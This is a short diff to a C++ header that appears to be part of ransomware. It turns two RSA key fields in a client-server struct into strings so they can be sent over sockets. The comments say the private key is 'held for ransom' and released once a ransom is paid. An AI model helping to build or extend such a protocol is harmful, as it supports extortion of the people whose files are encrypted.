@@ -104,8 +104,10 @@ typedef struct {
         The uniquely generated public RSA encryption key
         that is stored on the server alongside the private RSA
         encryption key. Used to encrypt.
+
+        in string form because you cant send BIO* over sockets.
     */
-    BIO*        publicEncryptionKey;
+    std::string        publicEncryptionKey;
 
     /*
         The RSA Private key the client can use to decrypt
@@ -113,8 +115,10 @@ typedef struct {
 
         Usually the thing held for ransom, so a check should
         be held if a ransom has been paid.
+
+        in string form because you cant send BIO* over sockets.
     */
-    BIO*        privateEncryptionKey;
+    std::string        privateEncryptionKey;
 
     // the action to perform of RemoteAction enum
     RemoteAction       action;
